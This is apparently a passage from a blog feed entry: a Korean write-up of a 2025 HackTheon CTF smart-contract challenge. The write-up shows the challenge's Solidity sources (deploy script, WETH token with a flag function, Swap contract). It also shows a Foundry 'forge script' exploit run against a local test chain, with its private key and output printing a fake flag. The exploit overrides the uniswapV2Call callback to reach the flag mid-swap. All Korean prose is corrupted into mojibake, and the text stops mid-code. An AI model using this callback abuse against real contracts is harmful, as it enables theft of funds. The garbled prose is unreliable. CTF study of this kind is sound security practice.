}}ÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÎçò ÎèÑÏ§ë swap Ìï®ÏàòÏóêÏÑú uniswapV2Call Ìï®ÏàòÍ∞Ä Íµ¨Ï≤¥Ï†ÅÏúºÎ°ú Ï†ïÏùòÍ∞Ä ÎêòÏñ¥ÏûàÎäîÍ≤ÉÏù¥ ÏïÑÎãå interfaceÎ•º ÌÜµÌï¥ Ìò∏Ï∂úÎêòÏñ¥ ÏûàÏóàÍ≥† overrideÌï¥ÏÑú FLAGÏùò Í∞íÏùÑ Î∂àÎü¨Ïò¨ Ïàò ÏûàÏóàÎã§.receiveÎ°ú ÌíÄÏù¥ÌïòÎäî Í≤ÉÎ≥¥Îã§ override Î•º ÌÜµÌï¥  FLAG Í∞íÏùÑ Í∞ÄÏ†∏Ïò§ÎèÑÎ°ù Ìïú Îí§ swap Ìï®ÏàòÎäî Ïò§Î•òÍ∞Ä Î∞úÏÉùÌïòÏßÄÎßå ÏÉÅÍ¥Ä ÏóÜÏù¥ try catchÎ°ú ÎÇ†Î†§ Ï£ºÏóàÎã§.$ forge script script/Exploit.sol:Exploit --broadcast --rpc-url http://127.0.0.1:12455 --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 260.23msCompiler run successful with warnings:Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.  --&gt; script/Exploit.sol:24:37:   |24 |     function uniswapV2Call(address, uint amount0Out, uint, bytes calldata) external override {   |                                     ^^^^^^^^^^^^^^^Warning (2018): Function state mutability can be restricted to pure  --&gt; src/Swap.sol:23:3:   |23 |   function _getExchange(uint amount0Out, uint amount1Out) public returns (uint) {   |   ^ (Relevant source part starts here and spans across multiple lines).Warning: Detected artifacts built from source files that no longer exist. Run `forge clean` to make sure builds are in sync with project files. - /home/mingw/contract-hacktheon/script/ExploitScript.s.solScript ran successfully.== Logs ==  FLAG:  FLAG{THIS_IS_FAKE_FLAG}## Setting up 1 EVM.==========================Chain 31337Estimated gas price: 0.266981935 gweiEstimated total gas used for script: 1313610Estimated amount required: 0.00035071013963535 ETH==========================##### anvil-hardhat‚úÖ  [Success] Hash: 0xed31043ebf8e104ee72068750450bea6779c95b68cacf202df7e6c2e7c41f481Block: 19Paid: 0.000012110491581919 ETH (117379 gas * 0.103174261 gwei)##### anvil-hardhat‚úÖ  [Success] Hash: 0x77ee82294078a8cce1ff60eb0bce0a09e5056650195371a1cad40f96c73d5339Contract Address: 0x0f5D1ef48f12b6f691401bfe88c2037c690a6afeBlock: 18Paid: 0.000102718077731487 ETH (878419 gas * 0.116935173 gwei)‚úÖ Sequence #1 on anvil-hardhat | Total Paid: 0.000114828569313406 ETH (995798 gas * avg 0.110054717 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<p><a href=\"https://0o3q.github.io/images/2025-04-27-HackTheon_contract/contract.zip\">contract.zip</a></p><p>2025 Ìó•ÌÖåÏò® ÏÑ∏Ï¢ÖÏóê Ï∂úÏ†úÎêòÏóàÎçò contract Î¨∏Ï†úÏù¥Îã§.</p><p>ÏÑúÎ≤ÑÍ∞Ä Îã´ÌòîÏßÄÎßå ÎèÑÏª§ÌååÏùºÍ≥º Ìï®Íªò ÌååÏùºÏùÑ Î∞õÏïÑ Î°úÏª¨ÏóêÏÑú Îã§Ïãú ÌíÄÏñ¥Î≥¥Î†§ÌïúÎã§.</p><h1 id=\"Î¨∏Ï†ú-Î∂ÑÏÑù\">Î¨∏Ï†ú Î∂ÑÏÑù</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: UNLICENSED</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">20</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">Script</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">WETH</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/WETH.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">HTOToken</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/HTOToken.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">DepositNFT</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/DepositNFT.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">VestingNFT</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/VestingNFT.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">YieldVault</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/YieldVault.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">Swap</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/Swap.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DeployScript</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">WETH</span> <span class=\"n\">wETH</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">WETH</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"wETH deployed at:\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">wETH</span><span class=\"p\">));</span>                <span class=\"n\">HTOToken</span> <span class=\"n\">htoToken</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HTOToken</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"HTOToken deployed at:\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">htoToken</span><span class=\"p\">));</span>                <span class=\"n\">DepositNFT</span> <span class=\"n\">depositNFT</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">DepositNFT</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"DepositNFT deployed at:\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">depositNFT</span><span class=\"p\">));</span>                <span class=\"n\">VestingNFT</span> <span class=\"n\">vestingNFT</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">VestingNFT</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"VestingNFT deployed at:\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">vestingNFT</span><span class=\"p\">));</span>                <span class=\"n\">YieldVault</span> <span class=\"n\">yieldVault</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">YieldVault</span><span class=\"p\">(</span>            <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">wETH</span><span class=\"p\">),</span>            <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">htoToken</span><span class=\"p\">),</span>            <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">depositNFT</span><span class=\"p\">),</span>            <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">vestingNFT</span><span class=\"p\">)</span>        <span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"YieldVault deployed at:\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">yieldVault</span><span class=\"p\">));</span>        <span class=\"n\">wETH</span><span class=\"p\">.</span><span class=\"n\">mint</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">yieldVault</span><span class=\"p\">),</span> <span class=\"mi\">255</span><span class=\"p\">);</span>         <span class=\"n\">htoToken</span><span class=\"p\">.</span><span class=\"n\">mint</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">yieldVault</span><span class=\"p\">),</span> <span class=\"mi\">340282366920938463463374607431768211455</span><span class=\"p\">);</span>         <span class=\"n\">depositNFT</span><span class=\"p\">.</span><span class=\"n\">transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">yieldVault</span><span class=\"p\">));</span>        <span class=\"n\">vestingNFT</span><span class=\"p\">.</span><span class=\"n\">transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">yieldVault</span><span class=\"p\">));</span>        <span class=\"n\">Swap</span> <span class=\"n\">swap</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Swap</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">wETH</span><span class=\"p\">),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">htoToken</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Swap deployed at:\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">swap</span><span class=\"p\">));</span>        <span class=\"n\">wETH</span><span class=\"p\">.</span><span class=\"n\">mint</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">swap</span><span class=\"p\">),</span> <span class=\"mi\">4294967295</span><span class=\"p\">);</span>         <span class=\"n\">htoToken</span><span class=\"p\">.</span><span class=\"n\">mint</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">swap</span><span class=\"p\">),</span> <span class=\"mi\">18446744073709551615</span><span class=\"p\">);</span>         <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">script/Deploy.s.sol</code>ÏóêÏÑúÎäî Î¨∏Ï†úÎ•º Î∞∞Ìè¨ÌïòÍ∏∞ ÏúÑÌïú ÏÑ∏ÌåÖÏùÑ Ìï¥Ï£ºÍ≥† ÏûàÎã§.</p><p>Î¨∏Ï†úÎ•º ÏúÑÌïú contractÏùò addressÎ•º Ï∂úÎ†•Ìïú Ïù¥ÌõÑÏóêÎäî <code class=\"language-plaintext highlighter-rouge\">src/WETH.sol</code>Ïùò <code class=\"language-plaintext highlighter-rouge\">mint</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≥† ÏûàÎã§.</p><h2 id=\"srcwethsol\">src/WETH.sol</h2><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: UNLICENSED</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">20</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span><span class=\"n\">Script</span><span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">ERC20</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">Ownable</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"@openzeppelin/contracts/access/Ownable.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">WETH</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span><span class=\"p\">,</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"Wrapping ETH\"</span><span class=\"p\">,</span> <span class=\"s\">\"WETH\"</span><span class=\"p\">)</span> <span class=\"n\">Ownable</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">mint</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">flag</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">string</span> <span class=\"k\">memory</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"o\">&gt;</span> <span class=\"mi\">100000000</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">_burn</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"mi\">100000000</span><span class=\"p\">);</span>            <span class=\"k\">return</span> <span class=\"s\">\"FLAG{THIS_IS_FAKE_FLAG}\"</span><span class=\"p\">;</span>        <span class=\"p\">}</span>        <span class=\"k\">return</span> <span class=\"s\">\"\"</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">src/WETH.sol</code> ÏΩîÎìúÎäî Îã§ÏùåÍ≥º Í∞ôÏúºÎ©∞ Ìï¥Îãπ ÌååÏùºÏóêÏÑú flag Ìï®ÏàòÎ°ú FLAGÎ•º ÏñªÏùÑ Ïàò ÏûàÏùÑ Í≤ÉÏúºÎ°ú Î≥¥Ïù∏Îã§.</p><h3 id=\"mint-Ìï®Ïàò\">mint Ìï®Ïàò</h3><hr /><p><code class=\"language-plaintext highlighter-rouge\">mint</code> Ìï®ÏàòÎäî <code class=\"language-plaintext highlighter-rouge\">_mint</code> Ìï®ÏàòÎ•º Îã§Ïãú Ìò∏Ï∂úÌïòÍ≥† ÏûàÏúºÎ©∞ Ïù¥ Ìï®ÏàòÍ∞Ä Ïñ¥Îñ§ Í∏∞Îä•ÏùÑ ÌïòÎäîÏßÄ Ï∞æÍ∏∞ ÏúÑÌï¥ Í≤ÄÏÉâÌï¥Î≥¥Î©¥</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">account</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">account</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"nb\">revert</span> <span class=\"n\">ERC20InvalidReceiver</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"n\">_update</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"n\">account</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span><span class=\"p\">}</span></code></pre></div></div><p>Îã§ÏùåÍ≥º Í∞ôÏùÄ ÏΩîÎìúÎ•º Î≥º Ïàò ÏûàÏóàÎã§.</p><p><code class=\"language-plaintext highlighter-rouge\">script/Deploy.s.sol</code> ÏóêÏÑú Î≥º Ïàò ÏûàÎìØÏù¥ <code class=\"language-plaintext highlighter-rouge\">account</code> Î≥ÄÏàòÎ°ú <code class=\"language-plaintext highlighter-rouge\">address(yieldVault)</code> Î•º Ï†ÑÎã¨ Î∞õÏïòÍ∏∞Ïóê Î∞îÎ°ú <code class=\"language-plaintext highlighter-rouge\">_update</code> Ìï®ÏàòÎ°ú Í∞ÄÎ≥¥Î©¥</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"n\">_update</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">from</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"c1\">// Overflow check required: The rest of the code assumes that totalSupply never overflows</span>        <span class=\"n\">_totalSupply</span> <span class=\"o\">+=</span> <span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">fromBalance</span> <span class=\"o\">=</span> <span class=\"n\">_balances</span><span class=\"p\">[</span><span class=\"n\">from</span><span class=\"p\">];</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">fromBalance</span> <span class=\"o\">&lt;</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span> <span class=\"n\">ERC20InsufficientBalance</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">fromBalance</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"p\">}</span>        <span class=\"kr\">unchecked</span> <span class=\"p\">{</span>            <span class=\"c1\">// Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span>            <span class=\"n\">_balances</span><span class=\"p\">[</span><span class=\"n\">from</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">fromBalance</span> <span class=\"o\">-</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">to</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"kr\">unchecked</span> <span class=\"p\">{</span>            <span class=\"c1\">// Overflow not possible: value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.</span>            <span class=\"n\">_totalSupply</span> <span class=\"o\">-=</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"kr\">unchecked</span> <span class=\"p\">{</span>            <span class=\"c1\">// Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.</span>            <span class=\"n\">_balances</span><span class=\"p\">[</span><span class=\"n\">to</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">emit</span> <span class=\"n\">Transfer</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">uint256 private _totalSupply</code>  Î≥ÄÏàòÏóê ÏûÖÎ†•Î∞õÏùÄ 255Î•º Ï†ÄÏû•Ìïú Îí§, <code class=\"language-plaintext highlighter-rouge\">address(yieldVault)</code> Ïùò <code class=\"language-plaintext highlighter-rouge\">_balance</code> Í∞íÏùÑ 255 ÎçîÌï¥Ï£ºÎäî Í≤ÉÏùÑ Î≥º Ïàò ÏûàÎã§.</p><p>Ïù¥Îïå <code class=\"language-plaintext highlighter-rouge\">unchecked</code> Î°ú Í∞êÏã∏Ï†∏ ÏûàÏúºÎØÄÎ°ú Ïò§Î≤ÑÌîåÎ°úÏö∞ Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌï† Ïàò ÏûàÏßÄÎßå ÏΩîÎìú ÏÉÅÏóêÏÑú Ïù¥Î°ú Ïù∏Ìïú Ïò§Î≤ÑÌîåÎ°úÏö∞Í∞Ä Î∞úÏÉùÌï† Í∞ÄÎä•ÏÑ±ÏùÄ ÏóÜÏñ¥Î≥¥Ïù∏Îã§.</p><p><code class=\"language-plaintext highlighter-rouge\">_balances</code>Îäî Îã§ÏùåÍ≥º Í∞ôÎã§.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">account</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">private</span> <span class=\"n\">_balances</span><span class=\"p\">;</span></code></pre></div></div><hr /><p>Ïù¥Î°ú Ïù∏Ìï¥ <code class=\"language-plaintext highlighter-rouge\">mint</code> Ìï®ÏàòÎäî Ï£ºÏÜåÏóê ÏûÖÎ†•Ìïú ÎßåÌÅºÏùò ÌÜ†ÌÅ∞ÏùÑ ÏÉùÏÑ±Ìï¥Ï§ÄÎã§Îäî Í≤ÉÏùÑ Ïïå Ïàò ÏûàÏóàÎã§.</p><h2 id=\"srcswapsol\">src/Swap.sol</h2><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: UNLICENSED</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">20</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">IERC20</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">ReentrancyGuard</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">WETH</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"./WETH.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">HTOToken</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"./HTOToken.sol\"</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">IUniswapV2Callee</span> <span class=\"p\">{</span>  <span class=\"k\">function</span> <span class=\"n\">uniswapV2Call</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"kt\">uint</span> <span class=\"n\">amount0Out</span><span class=\"p\">,</span> <span class=\"kt\">uint</span> <span class=\"n\">amount1Out</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Swap</span> <span class=\"k\">is</span> <span class=\"n\">ReentrancyGuard</span> <span class=\"p\">{</span>  <span class=\"n\">WETH</span> <span class=\"k\">public</span> <span class=\"n\">wETH</span><span class=\"p\">;</span>   <span class=\"n\">HTOToken</span> <span class=\"k\">public</span> <span class=\"n\">htoToken</span><span class=\"p\">;</span>  <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_wETH</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_htoToken</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"n\">wETH</span> <span class=\"o\">=</span> <span class=\"n\">WETH</span><span class=\"p\">(</span><span class=\"n\">_wETH</span><span class=\"p\">);</span>    <span class=\"n\">htoToken</span> <span class=\"o\">=</span> <span class=\"n\">HTOToken</span><span class=\"p\">(</span><span class=\"n\">_htoToken</span><span class=\"p\">);</span>  <span class=\"p\">}</span>  <span class=\"k\">function</span> <span class=\"n\">_getExchange</span><span class=\"p\">(</span><span class=\"kt\">uint</span> <span class=\"n\">amount0Out</span><span class=\"p\">,</span> <span class=\"kt\">uint</span> <span class=\"n\">amount1Out</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">return</span> <span class=\"n\">amount0Out</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span> <span class=\"o\">?</span> <span class=\"n\">amount0Out</span> <span class=\"o\">*</span> <span class=\"mi\">2</span> <span class=\"o\">:</span> <span class=\"n\">amount1Out</span> <span class=\"o\">/</span> <span class=\"mi\">2</span><span class=\"p\">;</span>   <span class=\"p\">}</span>  <span class=\"k\">function</span> <span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"kt\">uint</span> <span class=\"n\">amount0Out</span><span class=\"p\">,</span> <span class=\"kt\">uint</span> <span class=\"n\">amount1Out</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">nonReentrant</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"n\">_from</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">;</span>    <span class=\"kt\">uint</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">amount0Out</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>      <span class=\"n\">_from</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">wETH</span><span class=\"p\">);</span>      <span class=\"n\">_to</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">htoToken</span><span class=\"p\">);</span>      <span class=\"n\">_amount</span> <span class=\"o\">=</span> <span class=\"n\">amount0Out</span><span class=\"p\">;</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>      <span class=\"n\">_to</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">wETH</span><span class=\"p\">);</span>      <span class=\"n\">_from</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">htoToken</span><span class=\"p\">);</span>      <span class=\"n\">_amount</span> <span class=\"o\">=</span> <span class=\"n\">amount1Out</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>      <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">_to</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">_getExchange</span><span class=\"p\">(</span><span class=\"n\">amount0Out</span><span class=\"p\">,</span> <span class=\"n\">amount1Out</span><span class=\"p\">));</span>      <span class=\"n\">IERC20</span><span class=\"p\">(</span><span 